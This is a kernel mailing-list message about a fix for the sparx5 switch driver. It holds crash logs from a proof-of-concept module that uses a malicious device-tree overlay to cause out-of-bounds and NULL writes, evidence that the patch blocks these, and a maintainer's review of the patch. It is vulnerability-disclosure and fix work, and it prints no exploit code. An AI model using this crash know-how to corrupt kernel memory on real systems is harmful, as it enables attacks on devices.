+[    6.012826]   FSC =3D 0x06: level 2 translation fault
+[    6.012867] Data abort info:
+[    6.012888]   ISV =3D 0, ISS =3D 0x00000006, ISS2 =3D 0x00000000
+[    6.012913]   CM =3D 0, WnR =3D 0, TnD =3D 0
+[    6.012937]   GCS =3D 0, Overlay =3D 0, DirtyBit =3D 0
+[    6.013047] swapper pgtable: 4k pages, 48-bit VAs, pgdp=3D0000000044ca30=
+00
+[    6.013151] [ffff600022134221] pgd=3D0000000000000000,
+p4d=3D000000000068c78003, pud=3D000000000068c77003, pmd=3D0000000000000000
+[    6.014510] Internal error: Oops: 0000000096000006 [#1]  SMP
+[    6.017369] Modules linked in: poc_sparx5_oob(O+) sparx5_switch
+phylink bridge stp llc
+[    6.018234] CPU: 1 UID: 0 PID: 70 Comm: insmod Tainted: G    B
+O        7.4.0-rc2+ #1 PREEMPT(full)
+[    6.018478] Tainted: [B]=3DBAD_PAGE, [O]=3DOOT_MODULE
+[    6.018589] Hardware name: linux,dummy-virt (DT)
+[    6.018878] pstate: 10000005 (nzcV daif -PAN -UAO -TCO -DIT -SSBS BTYPE=
+=3D--)
+[    6.019147] pc : mchp_sparx5_probe+0x1838/0x4640 [sparx5_switch]
+[    6.019367] lr : mchp_sparx5_probe+0x1630/0x4640 [sparx5_switch]
+[    6.019559] sp : ffff800087726a80
+[    6.019664] x29: ffff800087726c40 x28: ffff000008d0af10 x27: ffff0000109=
+a0080
+[    6.019959] x26: dfff800000000000 x25: 1fffe000011a15e0 x24: ffff00000c1=
+0c000
+[    6.020166] x23: ffff80007f1ac980 x22: ffff00000c10cac0 x21: ffff80007f1=
+abc60
+[    6.020366] x20: 0000000020000000 x19: 1fffe000011a15e1 x18: 1ffff0000fe=
+39468
+[    6.020568] x17: 5f54455345525f48 x16: ffff00002ba925e0 x15: ffff8000803=
+95bf0
+[    6.020765] x14: ffff8000803958e0 x13: ffff800080395bf0 x12: ffff6000018=
+21875
+[    6.020967] x11: 1fffe00001821874 x10: ffff600001821874 x9 : dfff8000000=
+00000
+[    6.021213] x8 : ffff00000c10c3a7 x7 : 0000000000000001 x6 : ffff6000018=
+21874
+[    6.021422] x5 : ffff00000c10c3a0 x4 : ffff600001821875 x3 : 1fffe000018=
+21863
+[    6.021620] x2 : 000000000001088 x1 : 1fffe00022134221 x0 : ffff0001109a=
+1108
+[    6.021862] Call trace:
+[    6.021988]  mchp_sparx5_probe+0x1838/0x4640 [sparx5_switch] (P)
+
+--- mode 2, unpatched: reg=3D65 silent in-struct corruption, secondary
+NULL write ---
+
+[    7.401113] poc: prefilled GCB_CHIP_ID=3D0x7546000 @pa 0x7cc10000,
+HSCH_RESET_CFG=3D0x1 @pa 0x7d1a7a48
+[    7.403212] poc: applying malicious overlay - probe incoming
+[    7.427838] poc-stub-phy poc-stub-phy: stub serdes PHY provider register=
+ed
+[    7.457499] sparx5-switch 6bc00000.poc-sparx5: MAC addr was not
+set, use random MAC
+[    7.458007] sparx5-switch 6bc00000.poc-sparx5: error -ENXIO: IRQ
+fdma not found
+[    7.458367] sparx5-switch 6bc00000.poc-sparx5: error -ENXIO: IRQ
+xtr not found
+[    7.458432] sparx5-switch 6bc00000.poc-sparx5: error -ENXIO: IRQ
+ptp not found
+[    7.463894] ------------[ cut here ]------------
+[    7.464136] WARNING:
+drivers/net/ethernet/microchip/sparx5/sparx5_main.h:796 at
+sparx5_port_init+0x169c/0x1f40 [sparx5_switch], CPU#1: insmod/70
+[    7.464947] Modules linked in: poc_sparx5_oob(O+) sparx5_switch
+phylink bridge stp llc
+[    7.466616] CPU: 1 UID: 0 PID: 70 Comm: insmod Tainted: G    B
+O        7.4.0-rc2+ #1 PREEMPT(full)
+[    7.466932] Tainted: [B]=3DBAD_PAGE, [O]=3DOOT_MODULE
+[    7.467054] Hardware name: linux,dummy-virt (DT)
+[    7.467294] pstate: 60000005 (nZcv daif -PAN -UAO -TCO -DIT -SSBS BTYPE=
+=3D--)
+[    7.467504] pc : sparx5_port_init+0x169c/0x1f40 [sparx5_switch]
+[    7.467698] lr : sparx5_port_init+0xab8/0x1f40 [sparx5_switch]
+[    7.467888] sp : ffff8000876f6970
+[    7.467992] x29: ffff8000876f69a0 x28: 0000000000000001 x27: 00000000000=
+00001
+[    7.468282] x26: 0000000000000041 x25: 0000000088a80000 x24: 1fffe000021=
+9a8c6
+[...]
+[    7.511290] Unable to handle kernel NULL pointer dereference at
+virtual address 0000000000000004
+[    7.511350] Mem abort info:
+[    7.511368]   ESR =3D 0x0000000096000046
+[    7.511421]   EC =3D 0x25: DABT (current EL), IL =3D 32 bits
+[    7.511450]   SET =3D 0, FnV =3D 0
+[    7.511470]   EA =3D 0, S1PTW =3D 0
+[    7.511500]   FSC =3D 0x06: level 2 translation fault
+[    7.511528] Data abort info:
+[    7.511546]   ISV =3D 0, ISS =3D 0x0000000046, ISS2 =3D 0x00000000
+[    7.511569]   CM =3D 0, WnR =3D 1, TnD =3D 0
+[    7.511591]   GCS =3D 0, Overlay =3D 0, DirtyBit =3D 0
+[    7.511723] user pgtable: 4k pages, 48-bit VAs, pgdp=3D000000004e143000
+[    7.511825] [0000000000000004] pgd=3D080000004d7cd403,
+p4d=3D080000004d7cd403, pud=3D00000000004e12a403, pmd=3D0000000000000000
+[    7.512166] Internal error: Oops: 0000000096000046 [#1]  SMP
+[    7.513622] Modules linked in: poc_sparx5_oob(O+) sparx5_switch
+phylink bridge stp llc
+[    7.513915] CPU: 1 UID: 0 PID: 70 Comm: insmod Tainted: G    B   W
+O        7.4.0-rc2+ #1 PREEMPT(full)
+[    7.514127] Tainted: [B]=3DBAD_PAGE, [W]=3DWARN, [O]=3DOOT_MODULE
+[    7.514245] Hardware name: linux,dummy-virt (DT)
+[    7.514349] pstate: 80000005 (Nzcv daif -PAN -UAO -TCO -DIT -SSBS BTYPE=
+=3D--)
+[    7.514499] pc : sparx5_port_init+0x1028/0x1f40 [sparx5_switch]
+
+--- patched: all three modes rejected during DT parsing ---
+
+# Patched driver (exact patch as submitted) - all three attack modes interc=
+epted
+# source logs: run/evidence-emailpatch-mode{0,1,2}.log
+
+--- mode 0 ---
+[    7.553690] sparx5-switch 6bc00000.poc-sparx5: port 15839: reg out of ra=
+nge
+driver KASAN reports / oopses: 0
+--- mode 1 ---
+[    7.299818] sparx5-switch 6bc00000.poc-sparx5: port 536870912: reg
+out of range
+driver KASAN reports / oopses: 0
+--- mode 2 ---
+[    7.099245] sparx5-switch 6bc00000.poc-sparx5: port 65: reg out of range
+driver KASAN reports / oopses: 0
+
+Daniel Machon <daniel.machon@microchip.com> =E4=BA=8E2026=E5=B9=B411=E6=9C=
+=8816=E6=97=A5=E5=91=A8=E4=B8=80 06:13=E5=86=99=E9=81=93=EF=BC=9A
+>
+> Hi,
+>
+> > From: Haoran Wang <wanghr2026@mail.zgclab.edu.cn>
+> > Date: Fri, 13 Nov 2026 19:42:25 +0800
+> > Subject: [PATCH net-next] net: sparx5: check DT port reg against array =
+size
+> >
+> > mchp_sparx5_probe() reads the 'reg' property of each ethernet-port DT
+> > node into portno and passes it to sparx5_create_port(), which uses it
+> > to index the fixed-size sparx5->ports[SPX5_PORTS] array:
+> >
+> >     sparx5->ports[config->portno] =3D spx5_port;
+> >
+> > The value is never validated, so a device tree with an out-of-range
+> > 'reg' value (runtime overlay, corrupted or attacker-controlled DTB,
+> > kexec-supplied or bootloader-fixed-up DT) turns probe into an
+> > out-of-bounds write, potentially far outside the allocation.
+>
+> I seem to remember that these type of checks have been rejected with "dev=
+ice
+> tree is considered trusted". Though, we do the same check in lan966x, so =
+I am
+> not entirely sure.
+>
+> >
+> > Add a range check while parsing and skip nodes with an invalid port
+> > number.
+> >
+> > Fixes: f3cad2611a77 ("net: sparx5: add hostmode with phylink support")
+> > Signed-off-by: Haoran Wang <wanghr2026@mail.zgclab.edu.cn>
+> > ---
+> >  drivers/net/ethernet/microchip/sparx5/sparx5_main.c | 5 +++++
+> >  1 file changed, 5 insertions(+)
+> >
+> > diff --git a/drivers/net/ethernet/microchip/sparx5/sparx5_main.c b/driv=
+ers/net/ethernet/microchip/sparx5/sparx5_main.c
+> > index 08a398adf121..6616e76bd0e3 100644
+> > --- a/drivers/net/ethernet/microchip/sparx5/sparx5_main.c
+> > +++ b/drivers/net/ethernet/microchip/sparx5/sparx5_main.c
+> > @@ -845,6 +845,11 @@ static int mchp_sparx5_probe(struct platform_devic=
+e *pdev)
+> >                       dev_err(sparx5->dev, "port reg property error\n")=
+;
+> >                       continue;
+> >               }
+> > +             if (portno >=3D SPX5_PORTS) {
+>
+> This wont do.
+>
+> SPX5_PORTS is the size of ports[], which matches the sparx5 port count.
+> lan969x goes through the same probe but has only 30 ports.
+>
+> Instead do:
+>
+>         if (portno >=3D sparx5->data->consts->n_ports)
+>
+>
+> > +                     dev_err(sparx5->dev, "port %u: reg out of range\n=
+",
+> > +                             portno);
+> > +                     continue;
+> > +             }
+> >               config =3D &configs[idx];
+> >               conf =3D &config->conf;
+> >               conf->speed =3D SPEED_UNKNOWN;
+> > --
+> > 2.43.0
+>
+> Since a v2 is needed anyway, please also add what the bot asked for to th=
+e
+> commit message, and properly populate To and CC with get_maintainers.pl
+>
+> Thanks,
+> Daniel
+>
+> pw-bot: cr
